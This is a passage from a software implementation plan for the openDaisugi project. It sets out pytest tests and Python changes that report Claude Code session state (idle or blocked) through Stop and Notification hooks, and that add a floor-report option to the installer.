        payload, event="notification", fmt="claude", sessions_root=tmp_path / "sessions"
    )
    assert seen[-1]["state"] == "idle"


def test_notification_idle_prompt_with_its_real_type_is_idle(tmp_path, monkeypatch):
    """Classification is driven by notification_type alone when it is
    present — no message text at all to (mis)match against."""
    seen = []
    monkeypatch.setattr(
        "opendaisugi._state_report.report_state",
        lambda ev, **_k: seen.append(json.loads(ev)) or "none",
    )
    payload = json.dumps({"session_id": "s1", "notification_type": "idle_prompt"}).encode()
    record_lifecycle_event(
        payload, event="notification", fmt="claude", sessions_root=tmp_path / "sessions"
    )
    assert seen[-1]["state"] == "idle"


def test_lifecycle_event_never_raises_on_garbage_stdin(tmp_path, monkeypatch):
    monkeypatch.setattr("opendaisugi._state_report.report_state", lambda ev, **_k: "none")
    out = record_lifecycle_event(
        b"\xff not json", event="stop", fmt="claude", sessions_root=tmp_path / "sessions"
    )
    assert json.loads(out) == {"continue": True}


def test_cli_hook_record_event_stop(tmp_path, monkeypatch):
    from typer.testing import CliRunner

    from opendaisugi.cli import app

    monkeypatch.setattr("opendaisugi._state_report.report_state", lambda ev, **_k: "none")
    runner = CliRunner()
    res = runner.invoke(
        app,
        [
            "hook",
            "record",
            "--format",
            "claude",
            "--event",
            "stop",
            "--captures-root",
            str(tmp_path / "captures"),
        ],
        input=json.dumps({"session_id": "s1"}),
    )
    assert res.exit_code == 0
    assert json.loads(res.output) == {"continue": True}


def test_cli_hook_record_default_event_is_unchanged(tmp_path):
    """Backward compatibility: an installed hook that never passes --event
    (every hook installed before this plan) must behave exactly as before."""
    from typer.testing import CliRunner

    from opendaisugi.cli import app

    runner = CliRunner()
    res = runner.invoke(
        app,
        ["hook", "record", "--format", "claude", "--captures-root", str(tmp_path / "captures")],
        input=json.dumps(
            {"session_id": "s1", "tool_name": "Bash", "tool_input": {"command": "ls"}}
        ),
    )
    assert res.exit_code == 0
    assert json.loads(res.output) == {"continue": True}
    assert (tmp_path / "captures" / "s1.jsonl").exists()


def test_cli_hook_report_rejects_a_malformed_event(tmp_path):
    from typer.testing import CliRunner

    from opendaisugi.cli import app

    runner = CliRunner()
    res = runner.invoke(
        app,
        ["hook", "report", "--root", str(tmp_path / "gate")],
        input=json.dumps({"state": "not-a-real-state"}),
    )
    assert res.exit_code == 1


def test_cli_hook_report_accepts_a_valid_event(tmp_path, monkeypatch):
    from typer.testing import CliRunner

    from opendaisugi.cli import app
    from opendaisugi.session_tree import SessionTree

    monkeypatch.setattr("opendaisugi._state_report.report_state", lambda ev, **_k: "none")
    runner = CliRunner()
    row = {
        "v": 1,
        "ts": time.time(),
        "session_id": "s9",
        "harness": "pi",
        "state": "working",
        "source": "headless",
        "detail": "",
    }
    res = runner.invoke(
        app, ["hook", "report", "--root", str(tmp_path / "gate")], input=json.dumps(row)
    )
    assert res.exit_code == 0
    t = SessionTree.open(tmp_path / "sessions", "s9")
    states = [e for e in t.entries() if e.type == "state"]
    assert states[-1].data["state"] == "working"
```

Append to `tests/test_gate_resident.py` — the `hook report` path reachable through `gate.sock`:

```python
# --- daisugi hook report, reachable through gate.sock -----------------------


def test_hook_report_reachable_through_gate_sock(root: Path, server: Path, monkeypatch):
    monkeypatch.setattr("opendaisugi._state_report.report_state", lambda ev, **_k: "none")
    row = {
        "v": 1,
        "ts": time.time(),
        "session_id": "s9",
        "harness": "pi",
        "state": "idle",
        "source": "gate",
    }
    reply = ask_server(server, ["hook", "report", "--root", str(root)], json.dumps(row).encode())
    assert reply is not None and reply["exit_code"] == 0
    from opendaisugi.session_tree import SessionTree

    t = SessionTree.open(root.parent / "sessions", "s9")
    states = [e for e in t.entries() if e.type == "state"]
    # only the gate process itself may speak as 'gate' — a caller through
    # this channel is downgraded to 'headless', same as the CLI path.
    assert states[-1].data["source"] == "headless"


def test_hook_report_bad_argv_denies_through_gate_sock(root: Path, server: Path):
    reply = ask_server(server, ["hook", "report", "--root", str(root)], b"not json")
    assert reply is not None and reply["exit_code"] == 1


def test_gate_sock_still_dispatches_ordinary_gate_calls(root: Path, server: Path):
    """The new argv[:2] == ["hook", "report"] branch must not swallow the
    ordinary tool-call path."""
    reply = ask_server(server, _argv(root, "enforce"), PAYLOAD)
    assert reply is not None and reply["exit_code"] in (0, 2)
```

- [ ] **Step 2: Run the tests to confirm they fail**

Run: `cd /mnt/tera/working/programming/openDaisugi && uv run --no-sync pytest tests/test_hook_report_events.py tests/test_gate_resident.py -q`
Expected: `ImportError: cannot import name 'record_lifecycle_event'`; the `hook report` CLI
command and the `gate.sock` dispatch tests fail with a Typer "No such command" / a bad-argv deny
mismatch.

- [ ] **Step 3: Write the implementation**

Add to `src/opendaisugi/hook.py`, right after `record_and_contract` (≈ line 91):

```python
# Claude Code's Notification event (https://code.claude.com/docs/en/hooks) carries
# session_id, transcript_path, cwd, hook_event_name, message, title, and
# notification_type — one of exactly twelve documented values. Only these four
# mean a human is actually being asked something; every other value (idle_prompt,
# auth_success, elicitation_complete, elicitation_response, agent_completed,
# quota_auto_resume_fired, quota_auto_resume_stale, quota_auto_resume_disabled)
# is informational and reports idle.
_BLOCKING_NOTIFICATIONS = frozenset(
    {
        "permission_prompt",
        "elicitation_dialog",
        "elicitation_url_dialog",
        "agent_needs_input",
    }
)


def record_lifecycle_event(
    raw: bytes,
    *,
    event: str,
    fmt: str = "claude",
    sessions_root: Path | None = None,
) -> str:
    """Handle Claude Code's Stop and Notification hooks: session lifecycle,
    not a tool call. Reports 'idle' on Stop, and on Notification either
    'blocked' (a real request for a human — see ``_BLOCKING_NOTIFICATIONS``)
    or 'idle' (every other documented ``notification_type``) depending on
    the payload.

    MUST NOT raise, same contract as record_and_contract: a bad or missing
    payload still returns the host's allow contract.

    Classification: ``notification_type in _BLOCKING_NOTIFICATIONS`` when
    that field is present; when it is ABSENT, falls back to a "permission"
    substring match on ``message``. A present-but-non-blocking type (e.g.
    ``idle_prompt``) is idle regardless of what ``message`` says — the
    enum is authoritative once it exists. Fail this classification any
    OTHER way and it must fail toward idle, never toward a manufactured
    'blocked' (master spec §3.6): an over-eager blocked reading would show
    an operator a fake pending ask.
    """
    try:
        text = raw.decode("utf-8", "replace")
        payload = json.loads(text) if text.strip() else {}
    except Exception:
        payload = {}
    if not isinstance(payload, dict):
        payload = {}
    try:
        from opendaisugi._state_report import build_event, report_state
        from opendaisugi.gate import _HARNESS_BY_FMT

        sid = _safe_session_id(payload.get("session_id"))
        harness = _HARNESS_BY_FMT.get(fmt, fmt)
        if event == "stop":
            state, detail, ask_row = "idle", "session stop", None
        else:  # notification
            message = str(payload.get("message") or "")
            notif_type = payload.get("notification_type")
            is_permission = (
                notif_type in _BLOCKING_NOTIFICATIONS
                if notif_type
                else "permission" in message.lower()
            )
            if is_permission:
                state = "blocked"
                ask_row = {
                    "id": "harness",
                    "tool": str(notif_type or "notification"),
                    "summary": message,
                    "deadline": time.time() + 90,
                }
                detail = f"notification: {message}"[:200]
            else:
                state = "idle"
                detail = f"notification: {message}"[:200] if message else "notification"
                ask_row = None
        ev = build_event(
            session_id=sid,
            harness=harness,
            state=state,
            source="headless",
            harness_session_id=payload.get("session_id"),
            detail=detail,
            ask=ask_row,
        )
        report_state(ev)
        try:
            from opendaisugi.session_tree import SessionTree

            root = sessions_root or (DEFAULT_CAPTURES_ROOT.parent / "sessions")
            tree = SessionTree.open_or_create(
                root,
                session_id=sid,
                harness=harness,
                cwd=str(payload.get("cwd") or ""),
                harness_session_id=payload.get("session_id"),
                transcript_path=payload.get("transcript_path"),
            )
            tree.append("state", json.loads(ev))
        except Exception:
            pass
    except Exception:
        pass
    return stdout_for_format(fmt, block=False)
```

Modify `src/opendaisugi/cli.py`. First, `hook_record_cmd` gains `--event`:

```python
# OLD
@hook_app.command("record")
def hook_record_cmd(
    captures_root: Path = typer.Option(
        Path.home() / ".opendaisugi" / "captures",
        "--captures-root",
    ),
    fmt: str = typer.Option(
        "claude",
        "--format",
        help="Host runtime stdout contract: claude | codex | hermes | openclaw.",
    ),
) -> None:
    """Read a hook payload from stdin, record it, return the host's continue contract.

    Designed to be wired into Claude Code's PreToolUse hook, Hermes'
    shell-hook surface, OpenClaw's before_tool_call plugin, or any other host
    that emits JSON to stdin and reads JSON from stdout. Never blocks — even
    malformed input results in the host's allow contract so the runtime is
    never disrupted. ``--format`` selects which allow/continue shape to emit.
    """
    import sys
    import time

    from opendaisugi.hook import maybe_trigger_background_tend, record_and_contract

    try:
        raw = sys.stdin.buffer.read()
    except Exception:
        raw = b""
    # record_and_contract never raises and always returns the host allow contract.
    typer.echo(record_and_contract(raw, root=captures_root, fmt=fmt))
    # No-cron distillation: the contract is already emitted, so this can only
    # add latency, never correctness. Consent-gated, rate-limited, fully detached.
    maybe_trigger_background_tend(captures_root.parent, now=time.time())
```

```python
# NEW
@hook_app.command("record")
def hook_record_cmd(
    captures_root: Path = typer.Option(
        Path.home() / ".opendaisugi" / "captures",
        "--captures-root",
    ),
    fmt: str = typer.Option(
        "claude",
        "--format",
        help="Host runtime stdout contract: claude | codex | hermes | openclaw.",
    ),
    event: str = typer.Option(
        "pre_tool_use",
        "--event",
        help="Which host hook this is wired to: pre_tool_use (default, records "
        "the tool call) | stop (session went idle) | notification (a "
        "permission prompt or an idle-prompt notification).",
    ),
) -> None:
    """Read a hook payload from stdin, record it, return the host's continue contract.

    Designed to be wired into Claude Code's PreToolUse hook, Hermes'
    shell-hook surface, OpenClaw's before_tool_call plugin, or any other host
    that emits JSON to stdin and reads JSON from stdout. Never blocks — even
    malformed input results in the host's allow contract so the runtime is
    never disrupted. ``--format`` selects which allow/continue shape to emit.
    ``--event stop`` and ``--event notification`` report floor state
    (idle/blocked) instead of recording a tool call (spec-01).
    """
    import sys
    import time

    from opendaisugi.hook import (
        maybe_trigger_background_tend,
        record_and_contract,
        record_lifecycle_event,
    )

    try:
        raw = sys.stdin.buffer.read()
    except Exception:
        raw = b""
    if event in ("stop", "notification"):
        typer.echo(
            record_lifecycle_event(
                raw,
                event=event,
                fmt=fmt,
                sessions_root=captures_root.parent / "sessions",
            )
        )
        return
    # record_and_contract never raises and always returns the host allow contract.
    typer.echo(record_and_contract(raw, root=captures_root, fmt=fmt))
    # No-cron distillation: the contract is already emitted, so this can only
    # add latency, never correctness. Consent-gated, rate-limited, fully detached.
    maybe_trigger_background_tend(captures_root.parent, now=time.time())
```

Add a new `hook report` command, right after `hook_record_cmd` (before `hook_list_cmd`):

```python
@hook_app.command("report")
def hook_report_cmd(
    pane: str = typer.Option(None, "--pane", help="Pane id to stamp onto the event, if known."),
    root: Path = typer.Option(
        Path.home() / ".opendaisugi" / "gate",
        "--root",
        help="Gate data root — where the session tree this event appends to lives.",
    ),
) -> None:
    """Read one PaneStateEvent JSON line from stdin and deliver it.

    For a headless adapter or an in-process extension (the pi extension,
    the OpenCode plugin — specs 04/05) that cannot speak to the gate
    directly. Downgrades a claimed 'gate' or 'operator' source to
    'headless' — only the gate process itself may speak as the gate.
    Exits 0 once stdin parses to a valid event; exits 1 with the
    validation message on stderr for anything malformed.
    """
    import sys

    from opendaisugi._state_report import hook_report_argv

    try:
        raw = sys.stdin.buffer.read()
    except Exception:
        raw = b""
    argv = ["--root", str(root)]
    if pane:
        argv += ["--pane", pane]
    out = hook_report_argv(argv, raw)
    if out.stdout:
        typer.echo(out.stdout)
    if out.stderr:
        typer.echo(out.stderr, err=True)
    raise typer.Exit(code=out.exit_code)
```

Modify `src/opendaisugi/gate_server.py`:

```python
# OLD
        else:
            out = run_argv(argv, raw)
            reply = {"v": 1, "stdout": out.stdout, "stderr": out.stderr, "exit_code": out.exit_code}
```

```python
# NEW
        else:
            if argv[:2] == ["hook", "report"]:
                from opendaisugi._state_report import hook_report_argv

                out = hook_report_argv(argv[2:], raw)
            else:
                out = run_argv(argv, raw)
            reply = {"v": 1, "stdout": out.stdout, "stderr": out.stderr, "exit_code": out.exit_code}
```

- [ ] **Step 4: Run the tests to confirm they pass, and confirm no regression**

Run: `cd /mnt/tera/working/programming/openDaisugi && uv run --no-sync pytest tests/test_hook_report_events.py tests/test_gate_resident.py tests/test_hook.py tests/test_hook_format.py tests/test_cli_gate.py -q`
Expected: all pass.

- [ ] **Step 5: Lint and commit**

```bash
uv run --no-sync ruff check src/opendaisugi/hook.py src/opendaisugi/cli.py src/opendaisugi/gate_server.py tests/test_hook_report_events.py tests/test_gate_resident.py
git add src/opendaisugi/hook.py src/opendaisugi/cli.py src/opendaisugi/gate_server.py tests/test_hook_report_events.py tests/test_gate_resident.py
git commit -m "feat(hook): Stop/Notification report idle/blocked; daisugi hook report ships, reachable via CLI or gate.sock"
```

---

### Task 5: `daisugi install --gate --report herdr|coppice`, and the honesty tag in `daisugi modules`

**Files:**
- Modify: `src/opendaisugi/install.py` (Runtime protocol + all four runtime classes gain
  `report: str | None = None`; `ClaudeCodeRuntime.plan/apply/reverse`; generalized
  `_pop_json_hook`; new `_patch_claude_report_hooks`; `install()`'s signature and two call sites)
- Modify: `src/opendaisugi/config.py` (`Config.floor_report` field)
- Modify: `src/opendaisugi/modules.py` (`import shutil`; generalized `_claude_hook_installed`;
  new `"floor"` `Stage`)
- Modify: `src/opendaisugi/swap.py` (`STAGE_EFFECT` gains `"floor": CFG` — in this SAME task,
  since `tests/test_swap.py::test_effect_is_three_valued_and_covers_every_stage` asserts
  `set(STAGE_EFFECT) == {s.key for s in detect_stages(tmp_path)}` and would otherwise go red
  the moment `modules.py`'s new `"floor"` `Stage` lands)
- Modify: `src/opendaisugi/cli.py` (`install_cmd` gains `--report`; persists `floor_report` to
  config.yaml when `--report coppice`)
- Test: `tests/test_install_gate_report.py` (new)
- Modify: `tests/test_modules.py` (append floor-stage tests)
- Modify: `tests/test_swap.py` (append the `"floor"` effect-tag test)

**Interfaces:**
- Produces: `install.install(..., report: str | None = None) -> InstallResult` (new keyword,
  additive); `Runtime.plan(..., report: str | None = None)`, `Runtime.apply(..., report: str | None = None)` (every one of the four concrete runtimes accepts it; only `ClaudeCodeRuntime` acts
  on it — Codex/Hermes/OpenClaw silently ignore it, same precedent as `ask`);
  `install._pop_json_hook(settings_path, *, hook_substr, events: tuple[str, ...] = ("PreToolUse",))`
  (the default preserves every existing call site byte-for-byte); `config.Config.floor_report: str | None = None`; `swap.STAGE_EFFECT["floor"] = swap.CFG` (master §5.9's own reasoning for
  gate mode applies here too: the Stop/Notification hooks live in `~/.claude/settings.json`,
  which the harness owns and reloads, not us).

- [ ] **Step 1: Write the failing tests**

```python
# tests/test_install_gate_report.py
"""`daisugi install --gate --report herdr|coppice` (spec-01 §Interfaces).

herdr wires Claude Code's Stop + Notification hooks so the floor gets exact
idle/blocked signal between tool calls, not just around them. coppice is a
config-only placeholder — harness/coppice doesn't exist yet (spec-02).
"""

from __future__ import annotations

import json

from opendaisugi.config import load_config
from opendaisugi.install import (
    DEFAULT_LAYERS,
    ClaudeCodeRuntime,
    CodexRuntime,
    Layer,
    install,
    uninstall,
)

GATE_LAYERS = DEFAULT_LAYERS | {Layer.GATE}


def _settings(home):
    return json.loads((home / ".claude" / "settings.json").read_text())


def _commands(settings: dict, event: str) -> list[str]:
    entries = settings.get("hooks", {}).get(event, [])
    return [h["command"] for e in entries for h in e.get("hooks", [])]


def test_report_none_by_default_writes_no_stop_or_notification_hooks(tmp_path):
    (tmp_path / ".claude").mkdir()
    install(home=tmp_path, yes=True, runtimes=[ClaudeCodeRuntime()], layers=GATE_LAYERS)
    settings = _settings(tmp_path)
    assert _commands(settings, "Stop") == []
    assert _commands(settings, "Notification") == []


def test_report_herdr_adds_stop_and_notification_hooks(tmp_path):
    (tmp_path / ".claude").mkdir()
    install(
        home=tmp_path, yes=True, runtimes=[ClaudeCodeRuntime()], layers=GATE_LAYERS, report="herdr"
    )
    settings = _settings(tmp_path)
    stop_cmds = _commands(settings, "Stop")
    notif_cmds = _commands(settings, "Notification")
    assert len(stop_cmds) == 1 and "--event stop" in stop_cmds[0]
    assert len(notif_cmds) == 1 and "--event notification" in notif_cmds[0]


def test_report_herdr_is_idempotent(tmp_path):
    (tmp_path / ".claude").mkdir()
    for _ in range(2):
        install(
            home=tmp_path,
            yes=True,
            runtimes=[ClaudeCodeRuntime()],
            layers=GATE_LAYERS,
            report="herdr",
        )
    settings = _settings(tmp_path)
    assert len(_commands(settings, "Stop")) == 1
    assert len(_commands(settings, "Notification")) == 1


def test_report_herdr_without_gate_installs_nothing(tmp_path):
    (tmp_path / ".claude").mkdir()
    install(
        home=tmp_path,
        yes=True,
        runtimes=[ClaudeCodeRuntime()],
        layers=DEFAULT_LAYERS,
        report="herdr",
    )
    settings = _settings(tmp_path)
    assert _commands(settings, "Stop") == []


def test_report_coppice_writes_no_stop_or_notification_hooks(tmp_path):
    """coppice is config-only (cli.py's job, task 5), not a Runtime file
    change — harness/coppice doesn't exist yet (spec-02)."""
    (tmp_path / ".claude").mkdir()
    install(
        home=tmp_path,
        yes=True,
        runtimes=[ClaudeCodeRuntime()],
        layers=GATE_LAYERS,
        report="coppice",
    )
    settings = _settings(tmp_path)
    assert _commands(settings, "Stop") == []
    assert _commands(settings, "Notification") == []


def test_uninstall_removes_the_report_hooks(tmp_path):
    (tmp_path / ".claude").mkdir()
    install(
        home=tmp_path, yes=True, runtimes=[ClaudeCodeRuntime()], layers=GATE_LAYERS, report="herdr"
    )
    uninstall(home=tmp_path, runtimes=[ClaudeCodeRuntime()])
    settings = _settings(tmp_path)
    assert _commands(settings, "Stop") == []
    assert _commands(settings, "Notification") == []


def test_codex_silently_ignores_report(tmp_path):
    """Codex hooks.json has no Stop/Notification equivalent wired here —
    report is Claude Code only, same precedent as `ask`."""
    (tmp_path / ".codex").mkdir()
    steps = CodexRuntime().plan(tmp_path, GATE_LAYERS, report="herdr")
    assert all("report" not in s.description.lower() for s in steps)


def test_floor_report_config_field_defaults_to_none(tmp_path):
    assert load_config(tmp_path / "config.yaml").floor_report is None
```

Append to `tests/test_modules.py` (adjust the existing import line to add `AVAILABLE, POSSIBLE`):

```python
# OLD
from opendaisugi.modules import (
    ACTIVE,
    detect_stages,
    render_wiring,
    wiring_json,
)
```

```python
# NEW
from opendaisugi.modules import (
    ACTIVE,
    AVAILABLE,
    POSSIBLE,
    detect_stages,
    render_wiring,
    wiring_json,
)
```

```python
# appended to the end of the file
def test_floor_stage_reports_herdr_and_coppice_honestly(tmp_path):
    stages = detect_stages(tmp_path)
    floor = next(s for s in stages if s.key == "floor")
    names = {m.name for m in floor.modules}
    assert {"herdr", "coppice", "none"} <= names
    coppice = next(m for m in floor.modules if m.name == "coppice")
    assert coppice.state == POSSIBLE  # harness/coppice isn't built yet


def test_floor_stage_shows_coppice_active_once_the_preference_is_recorded(tmp_path):
    from opendaisugi.config import load_config, save_config

    cfg_path = tmp_path / "config.yaml"
    save_config(load_config(cfg_path).model_copy(update={"floor_report": "coppice"}), cfg_path)
    stages = detect_stages(tmp_path)
    floor = next(s for s in stages if s.key == "floor")
    coppice = next(m for m in floor.modules if m.name == "coppice")
    assert coppice.state == ACTIVE
```

Append to `tests/test_swap.py` (B2: `detect_stages` is about to grow a `"floor"` stage that
`STAGE_EFFECT` must cover, or `test_effect_is_three_valued_and_covers_every_stage` goes red):

```python
# appended to the end of the file
def test_floor_report_effect_is_cfg():
    # The Stop/Notification hooks live in settings.json, which the harness
    # owns and reloads — the same reason gate mode stays cfg, not live
    # (master §5.9).
    assert effect_of("floor") == "cfg"
```

- [ ] **Step 2: Run the tests to confirm they fail**

Run: `cd /mnt/tera/working/programming/openDaisugi && uv run --no-sync pytest tests/test_install_gate_report.py tests/test_modules.py tests/test_swap.py -q`
Expected: `TypeError: install() got an unexpected keyword argument 'report'`; `next(... "floor" ...)` raises `StopIteration`; `test_floor_report_effect_is_cfg` fails with `assert None == "cfg"`.

- [ ] **Step 3: Write the implementation**

Modify `src/opendaisugi/install.py`. First, add `report` to every `plan`/`apply` signature (the
Protocol and all four runtime classes share this exact three-line tail, so one `replace_all` edit
covers every occurrence — ten in total):

```python
# OLD (appears 10 times: the Protocol's plan and apply, and each of
# ClaudeCodeRuntime/HermesRuntime/CodexRuntime/OpenClawRuntime's plan and apply.
# install()'s own separate copy, four-space indented, is edited on its own below.)
        enforce: bool = False,
        ask: bool = False,
        base_url: str | None = None,
```

```python
# NEW (replace_all=True)
        enforce: bool = False,
        ask: bool = False,
        base_url: str | None = None,
        report: str | None = None,
```

Update the Runtime protocol's docstring to mention it:

```python
# OLD
    ``enforce``/``ask``/``base_url`` only matter to runtimes that
    support those two layers — everyone else ignores them (``ask`` is Claude
    Code's GATE layer only; Task 8). ``reverse`` (optional) always
```

```python
# NEW
    ``enforce``/``ask``/``base_url``/``report`` only matter to runtimes that
    support those layers — everyone else ignores them (``ask`` and
    ``report`` are Claude Code's GATE layer only; Task 8 and spec-01).
    ``reverse`` (optional) always
```

`ClaudeCodeRuntime.plan()`'s GATE block:

```python
# OLD
        if Layer.GATE in sel:
            mode = "ENFORCE" if enforce else "shadow"
            suffix = " + operator ask" if ask else ""
            steps.append(
                InstallStep(
                    Layer.GATE,
                    f"Install fail-closed gate PreToolUse hook ({mode}{suffix})",
                    claude_dir / "settings.json",
                )
            )
```

```python
# NEW
        if Layer.GATE in sel:
            mode = "ENFORCE" if enforce else "shadow"
            suffix = " + operator ask" if ask else ""
            steps.append(
                InstallStep(
                    Layer.GATE,
                    f"Install fail-closed gate PreToolUse hook ({mode}{suffix})",
                    claude_dir / "settings.json",
                )
            )
            if report == "herdr":
                steps.append(
                    InstallStep(
                        Layer.GATE,
                        "Add Stop + Notification floor-report hooks (Herdr)",
                        claude_dir / "settings.json",
                    )
                )
```

`ClaudeCodeRuntime.apply()`'s GATE block:

```python
# OLD
        if Layer.GATE in sel:
            modified += _patch_claude_gate(claude_dir / "settings.json", enforce=enforce, ask=ask)
```

```python
# NEW
        if Layer.GATE in sel:
            modified += _patch_claude_gate(claude_dir / "settings.json", enforce=enforce, ask=ask)
            if report == "herdr":
                modified += _patch_claude_report_hooks(claude_dir / "settings.json")
```

`ClaudeCodeRuntime.reverse()`:

```python
# OLD
        modified += _pop_json_hook(
            claude_dir / "settings.json",
            hook_substr=_GATE_HOOK_SUBSTR,
        )
        modified += _pop_json_env_key(claude_dir / "settings.json", key="ANTHROPIC_BASE_URL")
```

```python
# NEW
        modified += _pop_json_hook(
            claude_dir / "settings.json",
            hook_substr=_GATE_HOOK_SUBSTR,
        )
        modified += _pop_json_hook(
            claude_dir / "settings.json",
            hook_substr="daisugi hook record",
            events=("Stop", "Notification"),
        )
        modified += _pop_json_env_key(claude_dir / "settings.json", key="ANTHROPIC_BASE_URL")
```

Generalize `_pop_json_hook`:

```python
# OLD
def _pop_json_hook(settings_path: Path, *, hook_substr: str) -> list[Path]:
    """Remove the opendaisugi PreToolUse hook from settings.json; no-op if absent."""
    if not settings_path.exists():
        return []
    try:
        s = json.loads(settings_path.read_text())
    except (json.JSONDecodeError, OSError):
        return []
    pre = s.get("hooks", {}).get("PreToolUse")
    if not pre or not any(
        hook_substr in h.get("command", "") for e in pre for h in e.get("hooks", [])
    ):
        return []  # nothing of ours present
    _backup(settings_path)
    for e in pre:
        e["hooks"] = [h for h in e.get("hooks", []) if hook_substr not in h.get("command", "")]
    s["hooks"]["PreToolUse"] = [e for e in pre if e.get("hooks")]
    if not s["hooks"]["PreToolUse"]:
        del s["hooks"]["PreToolUse"]
    if not s["hooks"]:
        del s["hooks"]
    settings_path.write_text(json.dumps(s, indent=2) + "\n")
    return [settings_path]
```

```python
# NEW
def _pop_json_hook(
    settings_path: Path, *, hook_substr: str, events: tuple[str, ...] = ("PreToolUse",)
) -> list[Path]:
    """Remove the opendaisugi hook(s) matching ``hook_substr`` from the
    given settings.json hook event(s); no-op if absent from all of them.

    ``events`` defaults to ``("PreToolUse",)`` — every call site before the
    floor-report hooks (spec-01) removed exactly that one event, and this
    keeps them byte-identical. The report hooks live on ``Stop`` and
    ``Notification`` instead, so their reversal passes both.
    """
    if not settings_path.exists():
        return []
    try:
        s = json.loads(settings_path.read_text())
    except (json.JSONDecodeError, OSError):
        return []
    hooks = s.get("hooks", {})
    present = any(
        hook_substr in h.get("command", "")
        for ev in events
        for e in (hooks.get(ev) or [])
        for h in e.get("hooks", [])
    )
    if not present:
        return []  # nothing of ours present
    _backup(settings_path)
    for ev in events:
        entries = hooks.get(ev)
        if not entries:
            continue
        for e in entries:
            e["hooks"] = [h for h in e.get("hooks", []) if hook_substr not in h.get("command", "")]
        hooks[ev] = [e for e in entries if e.get("hooks")]
        if not hooks[ev]:
            del hooks[ev]
    if not hooks:
        del s["hooks"]
    settings_path.write_text(json.dumps(s, indent=2) + "\n")
    return [settings_path]
```

Add `_patch_claude_report_hooks` right before `_patch_claude_base_url`:

```python
# OLD
    pre.append(gate_entry)
    if existed:
        _backup(settings_path)
    settings_path.write_text(json.dumps(settings, indent=2) + "\n")
    return [settings_path]


def _patch_claude_base_url(settings_path: Path, url: str) -> list[Path]:
```

```python
# NEW
    pre.append(gate_entry)
    if existed:
        _backup(settings_path)
    settings_path.write_text(json.dumps(settings, indent=2) + "\n")
    return [settings_path]


_STOP_REPORT_HOOK = {
    "hooks": [{"type": "command", "command": "daisugi hook record --format claude --event stop"}],
}
_NOTIFICATION_REPORT_HOOK = {
    "hooks": [
        {"type": "command", "command": "daisugi hook record --format claude --event notification"}
    ],
}


def _patch_claude_report_hooks(settings_path: Path) -> list[Path]:
    """Add Stop + Notification hooks so the floor gets exact idle/blocked
    signal between tool calls, not just around them (spec-01). Idempotent
    by command substring, same pattern as ``_patch_claude_settings``'s
    PreToolUse block; skip-and-warn on unparseable settings.json.
    """
    existed = settings_path.exists()
    if existed:
        try:
            settings: dict = json.loads(settings_path.read_text())
        except (json.JSONDecodeError, OSError):
            warnings.warn(
                f"{settings_path} is not valid JSON; skipping floor-report hook "
                f"registration to avoid overwriting your Claude Code settings. "
                f"Fix the file and re-run `daisugi install`.",
                UserWarning,
                stacklevel=2,
            )
            return []
    else:
        settings = {}

    changed = False
    hooks = settings.setdefault("hooks", {})

    stop = hooks.setdefault("Stop", [])
    stop_cmds = {h["command"] for e in stop for h in e.get("hooks", []) if h.get("type") == "command"}
    if not any("daisugi hook record" in c and "--event stop" in c for c in stop_cmds):
        stop.append(_STOP_REPORT_HOOK)
        changed = True

    notif = hooks.setdefault("Notification", [])
    notif_cmds = {
        h["command"] for e in notif for h in e.get("hooks", []) if h.get("type") == "command"
    }
    if not any("daisugi hook record" in c and "--event notification" in c for c in notif_cmds):
        notif.append(_NOTIFICATION_REPORT_HOOK)
        changed = True

    if changed:
        if existed:
            _backup(settings_path)
        settings_path.write_text(json.dumps(settings, indent=2) + "\n")
        return [settings_path]
    return []


def _patch_claude_base_url(settings_path: Path, url: str) -> list[Path]:
```

Finally, `install()`'s signature and its two call sites:

```python
# OLD
def install(
    *,
    home: Path | None = None,
    dry_run: bool = False,
    yes: bool = False,
    runtimes: list | None = None,
    layers: "set[Layer] | None" = None,
    enforce: bool = False,
    ask: bool = False,
    base_url: str | None = None,
) -> InstallResult:
```

```python
# NEW
def install(
    *,
    home: Path | None = None,
    dry_run: bool = False,
    yes: bool = False,
    runtimes: list | None = None,
    layers: "set[Layer] | None" = None,
    enforce: bool = False,
    ask: bool = False,
    base_url: str | None = None,
    report: str | None = None,
) -> InstallResult:
```

```python
# OLD
    planned: list[InstallStep] = []
    for rt in active:
        planned.extend(rt.plan(home, layers, enforce=enforce, ask=ask, base_url=base_url))
```

```python
# NEW
    planned: list[InstallStep] = []
    for rt in active:
        planned.extend(
            rt.plan(home, layers, enforce=enforce, ask=ask, base_url=base_url, report=report)
        )
```

```python
# OLD
    for rt in active:
        try:
            modified.extend(rt.apply(home, layers, enforce=enforce, ask=ask, base_url=base_url))
        except Exception as exc:  # one malformed config must not abort the rest
```

```python
# NEW
    for rt in active:
        try:
            modified.extend(
                rt.apply(home, layers, enforce=enforce, ask=ask, base_url=base_url, report=report)
            )
        except Exception as exc:  # one malformed config must not abort the rest
```

Modify `src/opendaisugi/config.py`:

```python
# OLD
    # Preferred pathway-store backend. sqlite is the local default; the
    # git-backed shared registry is a separate opt-in set up with
    # `daisugi registry init` (a repo + signing keys), not a config toggle.
    pathway_store_backend: str = "sqlite"  # sqlite | git
```

```python
# NEW
    # Preferred pathway-store backend. sqlite is the local default; the
    # git-backed shared registry is a separate opt-in set up with
    # `daisugi registry init` (a repo + signing keys), not a config toggle.
    pathway_store_backend: str = "sqlite"  # sqlite | git

    # Floor-report preference (spec-01/06). Herdr's own liveness is
    # detected from the installed Stop/Notification hooks, not this field
    # — it only matters for coppice, which isn't built yet (spec-02):
    # `daisugi install --gate --report coppice` records the intent here so
    # `daisugi modules` can show it honestly ahead of the harness existing.
    floor_report: str | None = None  # None | herdr | coppice
```

Modify `src/opendaisugi/modules.py`:

```python
# OLD
import importlib.util
import json
import os
from dataclasses import asdict, dataclass, field
from pathlib import Path
```

```python
# NEW
import importlib.util
import json
import os
import shutil
from dataclasses import asdict, dataclass, field
from pathlib import Path
```

```python
# OLD
def _claude_hook_installed(kind_substr: str) -> bool:
    """Is a PreToolUse hook containing ``kind_substr`` registered for Claude Code?"""
    settings = Path.home() / ".claude" / "settings.json"
    try:
        data = json.loads(settings.read_text())
    except (OSError, ValueError):
        return False
    pre = data.get("hooks", {}).get("PreToolUse", [])
    cmds = [h.get("command", "") for e in pre for h in e.get("hooks", [])]
    return any(kind_substr in c for c in cmds)
```

```python
# NEW
def _claude_hook_installed(kind_substr: str, *, event: str = "PreToolUse") -> bool:
    """Is a hook containing ``kind_substr`` registered for Claude Code on
    ``event`` (default PreToolUse)?"""
    settings = Path.home() / ".claude" / "settings.json"
    try:
        data = json.loads(settings.read_text())
    except (OSError, ValueError):
